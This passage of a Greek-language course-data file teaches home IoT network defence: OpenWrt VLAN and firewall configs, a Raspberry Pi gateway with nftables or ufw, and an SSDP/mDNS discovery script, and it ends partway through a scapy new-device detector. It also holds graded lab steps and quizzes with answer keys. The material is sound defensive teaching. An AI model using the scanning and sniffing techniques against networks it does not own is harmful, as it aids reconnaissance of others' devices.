        ],
      },
    ],
  });

  // ====================================================================
  // MODULE 7 — Network segmentation για IoT
  // ====================================================================
  M.push({
    id: 'iot-7', order: 7, title: 'Network segmentation: το IoT στο δικό του δίκτυο',
    desc: 'Χωριστό VLAN/SSID για IoT, κανόνες firewall, το Raspberry Pi ως IoT gateway με nftables/ufw, και οι κίνδυνοι του mDNS και του UPnP.',
    lessons: [
      {
        id: 'iot-7-1', title: 'Γιατί segmentation: VLAN και χωριστό SSID', minutes: 15,
        goal: 'Να καταλάβεις πώς ένα χωριστό δίκτυο για IoT **περιορίζει τη ζημιά** όταν μια συσκευή παραβιαστεί, και να γράψεις κανόνες «ποιος μιλάει με ποιον».',
        blocks: [
          text(
            'Σε ένα «επίπεδο» (flat) οικιακό δίκτυο, όλα βλέπουν όλα: η φτηνή κάμερα από το Internet είναι στο ίδιο δίκτυο με το laptop όπου κάνεις e-banking και το NAS με τις φωτογραφίες σου. Αν παραβιαστεί η κάμερα, ο επιτιθέμενος έχει **σκαλοπάτι** για όλο το σπίτι (*lateral movement*).',
            '',
            '**Segmentation** σημαίνει να χωρίσεις το δίκτυο σε ζώνες με διαφορετική εμπιστοσύνη, και ένας **firewall** ανάμεσα να επιτρέπει μόνο ό,τι χρειάζεται.'
          ),
          anim('iot-vlan-segmentation', 'Η παραβιασμένη κάμερα δεν φτάνει ούτε το laptop ούτε το NAS. Το ESP32 φτάνει μόνο τον broker.'),
          table(['Ζώνη', 'Παράδειγμα', 'Υποδίκτυο', 'Εμπιστοσύνη'], [
            ['**LAN** (VLAN 10)', 'Laptops, κινητά, NAS', '192.168.1.0/24', 'Υψηλή'],
            ['**IoT** (VLAN 30)', 'ESP32, κάμερες, έξυπνα φις', '192.168.30.0/24', 'Χαμηλή'],
            ['**Guest** (VLAN 40)', 'Επισκέπτες', '192.168.40.0/24', 'Καμία'],
          ]),
          text(
            '### Οι κανόνες (policy)',
            'Πριν αγγίξεις ρυθμίσεις, γράψε σε χαρτί **ποιος χρειάζεται να μιλάει με ποιον**:',
            '- **LAN → IoT**: ✅ (βλέπεις την κάμερα, στέλνεις εντολές στον broker).',
            '- **IoT → LAN**: ❌ εκτός από **broker:8883** (αν ο broker είναι στο LAN).',
            '- **IoT → Internet**: μόνο ό,τι χρειάζεται (NTP, OTA server). Ιδανικά τίποτα άλλο.',
            '- **IoT → IoT**: ❌ αν γίνεται (client isolation στο AP). Τα ESP32 δεν χρειάζεται να μιλάνε μεταξύ τους, μιλάνε με τον broker.',
            '- **IoT → router**: μόνο DHCP (67/udp) και DNS (53).'
          ),
          text(
            '### Επιλογή 1: «Guest network» του router (το πιο εύκολο)',
            'Πολλοί οικιακοί routers έχουν guest Wi‑Fi με **απομόνωση** από το κύριο δίκτυο. Δεν είναι πλήρες VLAN, αλλά είναι τεράστια βελτίωση. Το πρόβλημα: τα ESP32 δεν θα βλέπουν τον broker στο LAN. Λύσεις: βάλε και το Pi στο guest δίκτυο, ή χρησιμοποίησε το Pi ως gateway (επόμενο μάθημα).',
            '',
            '### Επιλογή 2: Router με VLAN (π.χ. OpenWrt)'
          ),
          code('text', 'OpenWrt: /etc/config/network (απόσπασμα, DSA switch)', R`
config bridge-vlan
        option device 'br-lan'
        option vlan '10'
        list ports 'lan1:u*'
        list ports 'lan2:u*'

config bridge-vlan
        option device 'br-lan'
        option vlan '30'
        list ports 'lan3:u*'

config interface 'lan'
        option device 'br-lan.10'
        option proto 'static'
        option ipaddr '192.168.1.1'
        option netmask '255.255.255.0'

config interface 'iot'
        option device 'br-lan.30'
        option proto 'static'
        option ipaddr '192.168.30.1'
        option netmask '255.255.255.0'
`, L(
            '- `bridge-vlan`: ποιες θύρες του switch ανήκουν σε ποιο VLAN. `u*` = untagged και primary VLAN (PVID) της θύρας.',
            '- `lan3` πάει στο VLAN 30: εκεί συνδέεις π.χ. ένα δεύτερο AP μόνο για IoT, ή το Pi broker.',
            '- `interface \'iot\'`: νέο L3 δίκτυο `192.168.30.0/24` με τον router στο `.1`. Χρειάζεται και ενότητα `dhcp` για να μοιράζει διευθύνσεις.'
          )),
          code('text', 'OpenWrt: /etc/config/wireless και /etc/config/firewall (απόσπασμα)', R`
# --- Χωριστό SSID για IoT, WPA2/WPA3 mixed, PMF, απομόνωση clients ---
config wifi-iface 'iot_ap'
        option device 'radio0'          # 2.4 GHz (το ESP32 δεν έχει 5 GHz)
        option mode 'ap'
        option network 'iot'
        option ssid 'IoT-Net'
        option encryption 'sae-mixed'
        option key 'ΕΝΑΣ-ΜΑΚΡΥΣ-ΤΥΧΑΙΟΣ-ΚΩΔΙΚΟΣ'
        option ieee80211w '1'
        option isolate '1'

# --- Ζώνη firewall για IoT: τίποτα εκτός αν επιτραπεί ρητά ---
config zone
        option name 'iot'
        list network 'iot'
        option input 'REJECT'
        option output 'ACCEPT'
        option forward 'REJECT'

# LAN → IoT επιτρέπεται (stateful: οι απαντήσεις επιστρέφουν)
config forwarding
        option src 'lan'
        option dest 'iot'

config rule
        option name 'IoT-DHCP-DNS'
        option src 'iot'
        option proto 'tcp udp'
        option dest_port '53 67'
        option target 'ACCEPT'

config rule
        option name 'IoT-to-broker'
        option src 'iot'
        option dest 'lan'
        option dest_ip '192.168.1.50'
        option proto 'tcp'
        option dest_port '8883'
        option target 'ACCEPT'

config rule
        option name 'IoT-NTP'
        option src 'iot'
        option dest 'wan'
        option proto 'udp'
        option dest_port '123'
        option target 'ACCEPT'
`, L(
            '- `encryption \'sae-mixed\'`: WPA2-PSK + WPA3-SAE. `ieee80211w \'1\'`: PMF optional (προστασία από deauth για όσους το υποστηρίζουν).',
            '- `isolate \'1\'`: οι Wi‑Fi clients του IoT δεν βλέπουν ο ένας τον άλλον. Μια μολυσμένη συσκευή δεν σαρώνει τις υπόλοιπες.',
            '- `zone iot`: `input REJECT` (δεν μιλάει με τον router εκτός από τα ρητά), `forward REJECT` (δεν πάει πουθενά εκτός από τα ρητά).',
            '- `forwarding lan → iot`: το LAN ανοίγει συνδέσεις προς το IoT. Το αντίθετο **όχι**.',
            '- `IoT-to-broker`: η **μόνη** τρύπα από IoT προς LAN: TCP 8883 προς το Pi.',
            '- Χωρίς κανόνα `iot → wan` για άλλα ports, οι συσκευές δεν «τηλεφωνούν σπίτι» σε άγνωστα clouds.',
            '- Εφαρμογή: `uci commit && service network reload && service firewall reload`.'
          )),
          nw('lan', 'Μετά το segmentation, η καρτέλα **LAN** του NetWatch (στο laptop σου) δεν πρέπει πια να βλέπει καμία IoT συσκευή στο ίδιο broadcast domain.'),
          tip('Δεν έχεις router με VLAN; Ένα **Raspberry Pi με δεύτερο Wi‑Fi** μπορεί να γίνει το IoT δίκτυο και ο firewall μαζί. Αυτό κάνουμε στο επόμενο μάθημα.'),
          quiz('Μια κάμερα στο IoT VLAN παραβιάζεται. Με τους παραπάνω κανόνες, τι **μπορεί** να κάνει;',
            ['Να σαρώσει το laptop στο LAN', 'Να συνδεθεί μόνο στο 192.168.1.50:8883 (και να χρειαστεί έγκυρο user/pass + ACL εκεί)', 'Να μπει στο NAS', 'Να ανοίξει θύρα στο Internet μέσω του router'], 1,
            'Η μόνη τρύπα είναι ο broker, που προστατεύεται με TLS, κωδικό ανά συσκευή και ACL. Η ζημιά μένει **περιορισμένη**.'),
          quiz('Γιατί το `isolate` (client isolation) στο IoT SSID είναι χρήσιμο;',
            ['Αυξάνει την ταχύτητα', 'Οι IoT συσκευές δεν μπορούν να επιτεθούν η μία στην άλλη μέσα στο ίδιο δίκτυο', 'Κρυπτογραφεί την κίνηση', 'Κρύβει το SSID'], 1,
            'Ο firewall ελέγχει την κίνηση **ανάμεσα** σε δίκτυα. Μέσα στο ίδιο Wi‑Fi, μόνο το client isolation σταματά την κίνηση συσκευή-προς-συσκευή.'),
        ],
      },
      {
        id: 'iot-7-2', title: 'Το Raspberry Pi ως IoT gateway (nftables / ufw)', minutes: 20,
        goal: 'Να μετατρέψεις ένα Pi σε **access point για IoT** (NetworkManager) και firewall ανάμεσα στο IoT και το σπίτι, με **nftables** ή με κανόνες **ufw route**.',
        blocks: [
          text(
            'Η τοπολογία:',
            '- `eth0` → καλώδιο στον router του σπιτιού (LAN και Internet).',
            '- `wlan0` → **νέο Wi‑Fi «IoT-Net»** μόνο για ESP32 (10.42.0.0/24).',
            '- Το Pi κάνει DHCP, NAT, τρέχει τον Mosquitto, και **φιλτράρει** ό,τι περνάει από το IoT προς το σπίτι.',
            '',
            'Τα ESP32 βλέπουν μόνο το Pi. Και ως μπόνους, ό,τι στέλνουν περνάει από το Pi, άρα μπορείς να το παρακολουθείς (Εν. 8).'
          ),
          code('bash', 'Βήμα 1: access point με NetworkManager (Raspberry Pi OS Bookworm)', R`
sudo nmcli con add type wifi ifname wlan0 con-name IoT-AP autoconnect yes ssid IoT-Net \
  802-11-wireless.mode ap 802-11-wireless.band bg 802-11-wireless.channel 6 \
  ipv4.method shared ipv4.addresses 10.42.0.1/24 ipv6.method disabled \
  wifi-sec.key-mgmt wpa-psk wifi-sec.proto rsn wifi-sec.pairwise ccmp wifi-sec.group ccmp \
  wifi-sec.psk 'ΕΝΑΣ-ΜΑΚΡΥΣ-ΤΥΧΑΙΟΣ-ΚΩΔΙΚΟΣ-24+'

sudo nmcli con up IoT-AP
nmcli -f GENERAL.STATE,IP4.ADDRESS dev show wlan0

# Ποιες συσκευές πήραν IP;
cat /var/lib/NetworkManager/dnsmasq-wlan0.leases
`, L(
            '- `mode ap`: το Pi γίνεται access point. `band bg` + κανάλι 6: 2.4 GHz, όπου μιλάει το ESP32.',
            '- `ipv4.method shared`: το NetworkManager ξεκινά αυτόματα **dnsmasq** (DHCP/DNS) για το wlan0, ενεργοποιεί **IP forwarding** και **NAT** προς το eth0.',
            '- `proto rsn` + `ccmp`: **μόνο WPA2-AES**, όχι το παλιό WPA/TKIP.',
            '- Το Wi‑Fi του Pi σε AP mode συνήθως **δεν** υποστηρίζει WPA3-SAE, γι’ αυτό WPA2 με πολύ μακρύ κωδικό.',
            '- Στο `server.crt` του broker πρόσθεσε `IP:10.42.0.1` στο SAN, αφού τα ESP32 θα συνδέονται εκεί (Εν. 4.3).'
          )),
          text('### Βήμα 2α: firewall με nftables'),
          code('text', '/etc/nftables.conf', R`
#!/usr/sbin/nft -f
# Pi ως IoT gateway. eth0 = σπίτι/Internet, wlan0 = IoT (10.42.0.0/24)
# ΔΕΝ κάνουμε "flush ruleset": έτσι μένουν οι πίνακες NAT του NetworkManager.

table inet iotfw
delete table inet iotfw

table inet iotfw {
    set private_nets {
        type ipv4_addr; flags interval
        elements = { 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16 }
    }

    chain input {
        type filter hook input priority filter; policy drop;
        ct state established,related accept
        ct state invalid drop
        iif "lo" accept
        meta l4proto { icmp, ipv6-icmp } accept

        # Από το σπίτι: SSH και MQTT/TLS
        iifname "eth0" tcp dport { 22, 8883 } accept

        # Από το IoT: DHCP, DNS και ο broker. ΤΙΠΟΤΑ άλλο (π.χ. όχι SSH!)
        iifname "wlan0" udp dport { 53, 67 } accept
        iifname "wlan0" tcp dport { 53, 8883 } accept

        log prefix "nft-in-drop " limit rate 10/minute
    }

    chain forward {
        type filter hook forward priority filter; policy drop;
        ct state established,related accept
        ct state invalid drop

        # IoT → σπίτι (ιδιωτικές IP): ΠΟΤΕ
        iifname "wlan0" oifname "eth0" ip daddr @private_nets log prefix "iot-to-lan " drop

        # IoT → Internet: μόνο NTP (και HTTPS αν κάνεις OTA από εξωτερικό server)
        iifname "wlan0" oifname "eth0" udp dport 123 accept
        # iifname "wlan0" oifname "eth0" tcp dport 443 accept

        # Σπίτι → IoT: επιτρέπεται (π.χ. για debug από το laptop)
        iifname "eth0" oifname "wlan0" accept

        log prefix "nft-fwd-drop " limit rate 10/minute
    }
}
`, L(
            '- `table inet`: ένας πίνακας για IPv4 **και** IPv6.',
            '- `table … / delete table … / table … { }`: κόλπο για να ξαναφορτώνεται το αρχείο χωρίς σφάλμα, σβήνοντας **μόνο** τον δικό μας πίνακα.',
            '- `policy drop`: ό,τι δεν επιτρέπεται ρητά, κόβεται.',
            '- `ct state established,related accept`: stateful. Οι απαντήσεις σε συνδέσεις που επιτρέψαμε περνάνε.',
            '- `meta l4proto { icmp, ipv6-icmp }`: ping και ICMPv6 (χωρίς ICMPv6 το IPv6 δεν δουλεύει σωστά).',
            '- **Input από wlan0:** μόνο DHCP, DNS, 8883. Μια μολυσμένη συσκευή δεν μπορεί ούτε να δοκιμάσει SSH στο Pi.',
            '- `set private_nets`: όλες οι ιδιωτικές διευθύνσεις. Το IoT δεν φτάνει **κανένα** μηχάνημα του σπιτιού, ούτε τον router.',
            '- Το NAT (masquerade) το κάνει ήδη το NetworkManager (`ipv4.method shared`). Στο nftables, ένα πακέτο πρέπει να το δεχτούν **όλες** οι base chains του hook, οπότε το δικό μας `drop` ισχύει ό,τι κι αν επιτρέπει το NM.',
            '- `log … limit rate`: καταγράφει τα drops χωρίς να γεμίσει το journal.'
          )),
          code('bash', 'Εφαρμογή και έλεγχος', R`
sudo nft -c -f /etc/nftables.conf          # έλεγχος σύνταξης (dry run)
sudo nft -f /etc/nftables.conf
sudo systemctl enable nftables             # φόρτωση σε κάθε εκκίνηση
sudo nft list table inet iotfw

# Τι κόβεται; (ζωντανά)
sudo journalctl -kf | grep -E 'iot-to-lan|nft-'
`, L(
            '- `nft -c`: check mode, δεν αλλάζει τίποτα.',
            '- Το `nftables.service` του Debian φορτώνει το `/etc/nftables.conf` στο boot.',
            '- Από ένα ESP32 στο IoT-Net δοκίμασε να ανοίξεις σύνδεση στο laptop σου: θα δεις γραμμή `iot-to-lan` στο journal.'
          )),
          warn('**Διάλεξε ΕΝΑ εργαλείο firewall.** Αν έχεις ενεργό το **ufw** (Εν. 2.4) **και** δικό σου nftables ruleset, ισχύουν και τα δύο: ένα πακέτο περνά μόνο αν το επιτρέπουν **όλα**. Αυτό μπερδεύει πολύ στο debugging. Αν προτιμάς ufw, χρησιμοποίησε την επιλογή 2β.'),
          text('### Βήμα 2β: το ίδιο με ufw (αν ήδη το χρησιμοποιείς)'),
          code('bash', 'ufw: κανόνες για το IoT interface', R`
# Input από το IoT: μόνο DHCP, DNS, broker
sudo ufw allow in on wlan0 to any port 67 proto udp comment 'IoT DHCP'
sudo ufw allow in on wlan0 to any port 53 comment 'IoT DNS'
sudo ufw allow in on wlan0 to any port 8883 proto tcp comment 'IoT MQTT TLS'

# Forward: η default πολιτική του ufw για routed είναι DROP (/etc/default/ufw)
# Επιτρέπουμε ΜΟΝΟ NTP προς τα έξω
sudo ufw route allow in on wlan0 out on eth0 to any port 123 proto udp comment 'IoT NTP'

sudo ufw reload
sudo ufw status verbose          # δες: "Default: deny (incoming), allow (outgoing), deny (routed)"
`, L(
            '- `allow in on wlan0`: κανόνας μόνο για κίνηση που έρχεται από το IoT interface.',
            '- `ufw route`: κανόνες για κίνηση που **περνάει** από το Pi (forward), όχι για το ίδιο το Pi.',
            '- Με `DEFAULT_FORWARD_POLICY="DROP"`, ό,τι δεν επιτρέπεται με `route allow` κόβεται, άρα και το IoT → LAN.'
          )),
          cli('Lab: το Pi γίνεται IoT gateway', 'maria@raspberrypi:~ $', 'Raspberry Pi OS Bookworm (προσομοίωση). eth0 = σπίτι, wlan0 = ελεύθερο.', [
            { task: 'Ενεργοποίησε τη σύνδεση `IoT-AP` (έχει ήδη φτιαχτεί με `nmcli con add`).', expect: '^sudo\\s+nmcli\\s+(con|connection)\\s+up\\s+IoT-AP$', ans: 'sudo nmcli con up IoT-AP', out: 'Connection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/5)' },
            { task: 'Έλεγξε τη σύνταξη του `/etc/nftables.conf` χωρίς να το εφαρμόσεις.', expect: '^sudo\\s+nft\\s+-c\\s+-f\\s+/etc/nftables\\.conf$', ans: 'sudo nft -c -f /etc/nftables.conf', out: '' },
            { task: 'Φόρτωσε τους κανόνες.', expect: '^sudo\\s+nft\\s+-f\\s+/etc/nftables\\.conf$', ans: 'sudo nft -f /etc/nftables.conf', out: '' },
            { task: 'Ενεργοποίησε την υπηρεσία `nftables` για κάθε εκκίνηση.', expect: '^sudo\\s+systemctl\\s+enable\\s+(--now\\s+)?nftables(\\.service)?$', ans: 'sudo systemctl enable nftables', out: 'Created symlink /etc/systemd/system/sysinit.target.wants/nftables.service → /lib/systemd/system/nftables.service.' },
            { task: 'Δες τον πίνακα `inet iotfw`.', expect: '^sudo\\s+nft\\s+list\\s+table\\s+inet\\s+iotfw$', ans: 'sudo nft list table inet iotfw', out: 'table inet iotfw {\n  chain input { type filter hook input priority filter; policy drop; ... }\n  chain forward { type filter hook forward priority filter; policy drop; ... }\n}' },
            { task: 'Δες ποιες IoT συσκευές πήραν IP (αρχείο leases του dnsmasq του NM για wlan0).', expect: '^(sudo\\s+)?cat\\s+/var/lib/NetworkManager/dnsmasq-wlan0\\.leases$', ans: 'cat /var/lib/NetworkManager/dnsmasq-wlan0.leases', out: '1763400000 24:6f:28:aa:bb:cc 10.42.0.23 sensor01 01:24:6f:28:aa:bb:cc' },
          ], 'Το Pi είναι πλέον AP + DHCP + firewall + broker για τα ESP32 σου.'),
          quiz('Γιατί δεν βάζουμε `flush ruleset` στην αρχή του `/etc/nftables.conf` σε αυτό το setup;',
            ['Γιατί είναι αργό', 'Γιατί θα έσβηνε και τους πίνακες NAT που έφτιαξε το NetworkManager για το shared connection', 'Γιατί απαγορεύεται στο Pi', 'Γιατί σβήνει τα logs'], 1,
            'Το `flush ruleset` σβήνει **όλους** τους πίνακες. Σβήνουμε μόνο τον δικό μας (`delete table inet iotfw`).'),
          quiz('Ένα παραβιασμένο ESP32 στο IoT-Net δοκιμάζει `ssh 10.42.0.1`. Τι γίνεται;',
            ['Ζητείται κωδικός', 'Κόβεται στο input chain: από το wlan0 επιτρέπονται μόνο 53, 67 και 8883', 'Περνάει γιατί είναι το gateway', 'Περνάει γιατί είναι ιδιωτική IP'], 1,
            'Ο κανόνας για το SSH αφορά μόνο το `eth0`. Από το IoT το Pi εκθέτει μόνο τις 3 υπηρεσίες που χρειάζονται οι συσκευές.'),
        ],
      },
      {
        id: 'iot-7-3', title: 'mDNS, UPnP και άλλοι «βοηθητικοί» κίνδυνοι', minutes: 14,
        goal: 'Να δεις τι **ανακοινώνουν** οι συσκευές σου στο δίκτυο (mDNS, SSDP), να ελέγξεις αν ο router σου ανοίγει θύρες μόνος του με **UPnP**, και να τα κλείσεις.',
        blocks: [
          text(
            'Τα πρωτόκολλα «zero configuration» κάνουν τη ζωή εύκολη. Και για τον επιτιθέμενο:',
            '- **mDNS / DNS-SD** (`.local`, θύρα 5353/udp): κάθε συσκευή φωνάζει «είμαι το `sensor01`, έχω OTA στη 3232, web στο 80». Δωρεάν χάρτης του δικτύου σου.',
            '- **SSDP / UPnP** (1900/udp): συσκευές περιγράφουν τον εαυτό τους (μοντέλο, έκδοση firmware) και, χειρότερο, ζητούν από τον router να **ανοίξει θύρες στο Internet** (UPnP IGD), χωρίς να σε ρωτήσουν.',
            '',
            'Πολλές κάμερες «βρέθηκαν» στο Shodan ακριβώς έτσι: άνοιξαν μόνες τους port forwarding με UPnP.'
          ),
          code('bash', 'Τι ανακοινώνεται στο δίκτυό σου (mDNS)', R`
sudo apt install -y avahi-utils
# Όλες οι υπηρεσίες, με επίλυση σε IP/θύρα, και έξοδος όταν τελειώσει
avahi-browse -art | grep -E '^=|hostname|address|port|txt' | head -60

# Μόνο ArduinoOTA συσκευές
avahi-browse -rt _arduino._tcp
`, L(
            '- `-a` όλα τα είδη υπηρεσιών, `-r` resolve (IP/θύρα), `-t` τερματισμός μετά το αρχικό scan.',
            '- `_arduino._tcp`: έτσι διαφημίζει το ArduinoOTA ότι δέχεται firmware. Το TXT record δείχνει και αν θέλει κωδικό (`auth_upload=yes`).',
            '- Στο ESP32 μπορείς να το κλείσεις: `ArduinoOTA.setMdnsEnabled(false);` πριν το `begin()`. Το Arduino IDE τότε δεν βρίσκει τη συσκευή αυτόματα, αλλά δίνεις την IP με το χέρι.'
          )),
          code('python', 'ssdp_scan.py: ποιος απαντά σε UPnP discovery (στο ΔΙΚΟ σου LAN)', R`
#!/usr/bin/env python3
import socket

MSG = "\r\n".join([
    "M-SEARCH * HTTP/1.1",
    "HOST: 239.255.255.250:1900",
    'MAN: "ssdp:discover"',
    "MX: 2",
    "ST: ssdp:all",
    "", ""]).encode()

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
s.settimeout(4)
s.sendto(MSG, ("239.255.255.250", 1900))

found = {}
try:
    while True:
        data, (ip, _) = s.recvfrom(65507)
        headers = {}
        for line in data.decode(errors="replace").split("\r\n")[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip().upper()] = v.strip()
        found.setdefault(ip, set()).add((headers.get("SERVER", "?"), headers.get("ST", "?")))
except socket.timeout:
    pass

for ip, items in sorted(found.items()):
    print(f"\n{ip}")
    for server, st in sorted(items):
        flag = "🔴 UPnP IGD (router που ανοίγει θύρες!)" if "InternetGatewayDevice" in st else ""
        print(f"   {st[:60]:<60} {server[:40]} {flag}")
`, L(
            '- **SSDP** στέλνει ένα HTTP-like μήνυμα `M-SEARCH` στη multicast διεύθυνση `239.255.255.250:1900`.',
            '- `ST: ssdp:all`: «όλοι όσοι μιλάτε UPnP, απαντήστε».',
            '- Η κεφαλίδα `SERVER` συχνά αποκαλύπτει **λειτουργικό και έκδοση** (π.χ. `Linux/3.10 UPnP/1.0 …`): χρήσιμο για να ξέρεις τι χρειάζεται ενημέρωση.',
            '- Αν ο router σου απαντά ως `InternetGatewayDevice`, έχει **UPnP IGD ενεργό**: οποιαδήποτε συσκευή στο LAN μπορεί να του ζητήσει port forwarding.'
          )),
          code('bash', 'Ποιες θύρες έχει ήδη ανοίξει το UPnP στον router σου;', R`
sudo apt install -y miniupnpc
upnpc -l
# Αν δεις γραμμές όπως:  TCP  8080->192.168.1.77:80  'IPCam'
# μια κάμερα έχει ανοίξει μόνη της θύρα στο Internet!
`, L(
            '- `upnpc -l`: ρωτάει τον router (IGD) για τα ενεργά port mappings.',
            '- Κάθε γραμμή είναι μια θύρα του σπιτιού σου **ανοιχτή στο Internet**.',
            '- **Λύση:** απενεργοποίησε το UPnP στις ρυθμίσεις του router και κάνε χειροκίνητα port forwarding μόνο για ό,τι πραγματικά χρειάζεσαι (ιδανικά: τίποτα, και VPN για απομακρυσμένη πρόσβαση).'
          )),
          table(['Πρωτόκολλο', 'Θύρα', 'Κίνδυνος', 'Τι κάνεις'], [
            ['mDNS', '5353/udp', 'Αποκαλύπτει υπηρεσίες, spoofing ονομάτων `.local`', 'Κλείσε σε συσκευές που δεν το χρειάζονται, μην το «γεφυρώνεις» μεταξύ VLAN'],
            ['SSDP/UPnP', '1900/udp', 'Αποκαλύπτει μοντέλα/εκδόσεις', 'Απενεργοποίηση στις συσκευές αν γίνεται'],
            ['UPnP IGD', 'router', 'Αυτόματο port forwarding', '**Απενεργοποίηση στον router**'],
            ['LLMNR/NetBIOS', '5355, 137', 'Name poisoning (κυρίως Windows)', 'Απενεργοποίηση'],
          ]),
          warn('Μην ενεργοποιείς **mDNS reflector** (π.χ. `enable-reflector=yes` στο avahi, ή «mDNS repeater» στον router) ανάμεσα σε LAN και IoT χωρίς σοβαρό λόγο. Ξαναενώνει τα δίκτυα σε επίπεδο ανακάλυψης υπηρεσιών και ακυρώνει μέρος του segmentation.'),
          nw('devs', 'Η λίστα **συσκευών** του NetWatch δείχνει ποιες συσκευές είναι στο δίκτυο και τον κατασκευαστή τους από τη MAC. Σύγκρινέ τη με όσα βρήκε το `avahi-browse`.'),
          nw('priv', 'Στην καρτέλα **🕵 Ανωνυμία** δες τη δημόσια IP σου. Μετά δοκίμασε το Shodan (καρτέλα Pentest) για να βεβαιωθείς ότι **καμία** IoT θύρα δεν φαίνεται στο Internet.'),
          quiz('Το `upnpc -l` δείχνει `TCP 554->192.168.1.77:554 \'IPCam\'`. Τι σημαίνει;',
            ['Η κάμερα είναι offline', 'Η κάμερα άνοιξε μόνη της, μέσω UPnP, τη θύρα RTSP στο Internet: όποιος βρει την IP σου βλέπει (ή δοκιμάζει) τη ροή της', 'Είναι φυσιολογικό και ασφαλές', 'Η κάμερα χρησιμοποιεί VPN'], 1,
            'Αυτό ακριβώς εκμεταλλεύονται τα botnets. Απενεργοποίησε το UPnP στον router και σβήσε το mapping.'),
          quiz('Πώς σταματάς ένα ESP32 με ArduinoOTA να διαφημίζει την υπηρεσία OTA μέσω mDNS;',
            ['`WiFi.setHostname("")`', '`ArduinoOTA.setMdnsEnabled(false)` πριν το `begin()`', 'Δεν γίνεται', 'Με `setMinSecurity`'], 1,
            'Χωρίς mDNS η υπηρεσία δεν «φωνάζει» στο δίκτυο. Συνδύασέ το με κωδικό OTA και παράθυρο ενεργοποίησης (Εν. 5.3).'),
        ],
      },
    ],
  });

  // ====================================================================
  // MODULE 8 — Monitoring
  // ====================================================================
  M.push({
    id: 'iot-8', order: 8, title: 'Παρακολούθηση: το Pi ως μικρό IDS',
    desc: 'NetWatch στο Raspberry Pi, scapy για νέες συσκευές και ARP spoofing, heartbeat και ανίχνευση ανωμαλιών από τα ESP32.',
    lessons: [
      {
        id: 'iot-8-1', title: 'NetWatch στο Pi και ανίχνευση νέων συσκευών με scapy', minutes: 18,
        goal: 'Να τρέξεις το **NetWatch** στο Raspberry Pi και να το βλέπεις με ασφάλεια από το laptop, και να γράψεις δικό σου ανιχνευτή **νέων συσκευών** με scapy.',
        blocks: [
          text(
            'Η πρόληψη (hardening, TLS, firewall) δεν είναι ποτέ 100%. Χρειάζεσαι και **ανίχνευση**: να ξέρεις πότε κάτι αλλάζει. Ένα Raspberry Pi που τρέχει 24/7 είναι ιδανικός «φύλακας» για το δίκτυο.',
            '',
            'Αν το Pi είναι **gateway** του IoT (Εν. 7.2), όλη η κίνηση των ESP32 περνάει από το `wlan0` του, οπότε τη βλέπει ολόκληρη.'
          ),
          code('bash', 'NetWatch στο Raspberry Pi', R`
sudo apt install -y git python3-venv libpcap-dev
git clone <το-repo-του-netwatch> ~/netwatch     # ή αντέγραψε τον φάκελο με scp
cd ~/netwatch
./run.sh --no-open -i wlan0          # wlan0 = το IoT δίκτυο του gateway (ή eth0)

# Από το LAPTOP σου: SSH tunnel προς το Pi
ssh -N -L 8765:127.0.0.1:8765 maria@pi-broker.local
# και άνοιξε στον browser: http://127.0.0.1:8765
`, L(
            '- Το `run.sh` φτιάχνει μόνο του `.venv` και εγκαθιστά τα requirements την πρώτη φορά. Το live capture θέλει `sudo`.',
            '- `--no-open`: δεν προσπαθεί να ανοίξει browser (το Pi είναι headless).',
            '- `-i wlan0`: ακούει στο IoT interface. Στο `eth0` θα έβλεπες την κίνηση του ίδιου του Pi και το broadcast του σπιτιού.',
            '- Το NetWatch ακούει **μόνο** στο `127.0.0.1:8765`. Δεν εκτίθεται στο δίκτυο: το βλέπεις μέσα από **SSH tunnel** (`-L`), που είναι κρυπτογραφημένο και θέλει το κλειδί σου.',
            '- `-N`: το SSH δεν ανοίγει shell, μόνο το tunnel.',
            '- Υπάρχει και `docker compose up` (Linux), αν προτιμάς container.'
          )),
          nw('devs', 'Στη λίστα **συσκευών** του NetWatch κάθε άγνωστη συσκευή που εμφανίζεται στο δίκτυο σηκώνει ειδοποίηση «Νέα συσκευή στο Wi‑Fi».'),
          text(
            '### Φτιάξε τον δικό σου ανιχνευτή με scapy',
            'Για να καταλάβεις **πώς** δουλεύει ένας τέτοιος ανιχνευτής, γράψε έναν μικρό: ακούει **ARP** (κάθε συσκευή IPv4 στέλνει ARP) και **DHCP** (για το hostname), θυμάται ποιες MAC έχει δει, και ειδοποιεί για νέες.'
          ),
          code('bash', 'Εγκατάσταση scapy στο venv', R`
~/iot-venv/bin/pip install scapy paho-mqtt
# Το sniffing θέλει root: τρέχεις με sudo το python του venv
sudo ~/iot-venv/bin/python new_devices.py
`, L(
            '- Το scapy διαβάζει raw πακέτα, κάτι που απαιτεί δικαιώματα root (ή `CAP_NET_RAW`).'
          )),
          code('python', 'new_devices.py: ειδοποίηση για νέες συσκευές', R`
#!/usr/bin/env python3
"""Παθητικός ανιχνευτής νέων συσκευών (ARP + DHCP) με ενεργό ARP scan κάθε 10'."""
import json
import os
import threading
import time
from scapy.all import ARP, DHCP, Ether, sniff, srp

IFACE = "wlan0"                       # ή eth0
SUBNET = "10.42.0.0/24"               # το δίκτυο του IFACE
DB = "/var/lib/iotwatch/known.json"

os.makedirs(os.path.dirname(DB), exist_ok=True)
try:
    known = json.load(open(DB))
except (OSError, ValueError):
    known = {}
lock = threading.Lock()


def alert(text):
    print(time.strftime("%F %T"), "🚨", text, flush=True)
    # Εδώ μπορείς να στείλεις MQTT/Telegram (δες monitor.py στο 8.3)


def seen(mac, ip, hostname=None, how="arp"):
    mac = mac.lower()
    if mac in ("00:00:00:00:00:00", "ff:ff:ff:ff:ff:ff"):
        return
    with lock:
        dev = known.get(mac)
        if dev is None:
            known[mac] = {"ip": ip, "host": hostname, "first": time.time(), "last": time.time()}
            alert(f"ΝΕΑ συσκευή {mac} ip={ip} host={hostname} ({how})")
        else:
            if ip and ip != "0.0.0.0" and dev["ip"] != ip:
                print(f"ℹ️  {mac}: IP {dev['ip']} → {ip}")
                dev["ip"] = ip
            if hostname:
                dev["host"] = hostname
            dev["last"] = time.time()
        json.dump(known, open(DB, "w"), indent=1)


def dhcp_hostname(pkt):
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == "hostname":
